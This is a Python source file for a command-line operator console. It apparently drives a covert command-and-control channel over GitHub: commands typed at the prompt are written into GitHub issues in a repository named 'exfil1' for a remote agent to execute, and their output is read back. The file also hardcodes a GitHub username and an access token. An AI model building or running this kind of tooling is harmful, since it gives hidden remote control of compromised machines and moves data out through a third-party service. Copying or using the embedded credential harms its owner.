from github import Github
from github.GithubException import GithubException
from github.GithubObject import NotSet
from uuid import uuid4
from yaml import load, dump, scanner
import cmd2, os
import ghlib

class GitClient(cmd2.Cmd):
	"""Shuttles async commands via Github"""
	def __init__(self):
		cmd2.Cmd.__init__(self)
		self.prompt = '(gh)> '

	def do_execute(self, lcommand):
		"""execute <command [arguments]>
		Send `command` and its arguments to server """
		if lcommand:
			print("Executing {}".format(lcommand))
			stream = file(os.path.join(self.templatedir, 'execlocal.tmpl'), 'r')  
			instructions=load(stream)
			instructions['issue']['body']['request'][0]['execlocal']['command']=lcommand
			self.issue=ghlib.createIssueFromInstructions(self.agentid, self.repo, instructions)

			if self.issue is not None:
				print("Created task: ({}) - {}".format(self.issue.number, self.issue.title))
		else:
			print('Need command')

	def do_checkoutput(self, task_number):
		"""checkoutput <task number>
		Check output of `task` from server """
		if task_number:
			print("Checking status and output of task ({})".format(task_number))
			ghlib.checkIssueOutput(self.repo, task_number)
		else:
			print('Need task number')

	def do_checkstates(self, top=5):
		"""checkstates <number>
		Check status of tasks"""
		print("Checking status of {} tasks for agent ({})".format(top, self.agentid))
		ghlib.checkIssueStates(self.repo, self.agentid, top)


	def do_EOF(self, line):
		return True

	def preloop(self):

		user_name="drtkn"
		token="dbba5bd20be0a59543762bd19e881d351ce118c7"
		repo_name="exfil1"

		self.agentid="a932e9f5-2501-4c60-b5da-8a61ac244792"
		self.g = Github(user_name, token)
		self.user=self.g.get_user()
		self.templatedir="./templates"
		#print("== List of repos  for user {}...".format(user))
		#for repo in self.g.get_user().get_repos():
		#	print(repo.name)

		self.reqfile="./instructions"
		self.repo=ghlib.checkRepoExists(self.user,repo_name)
		if self.repo is None:
			#repo.create_file('/agent1/filename2', 'commitmessage', 'content')
			#Create issue with a request
			self.repo=ghlib.createRepo(self.user,repo_name) 

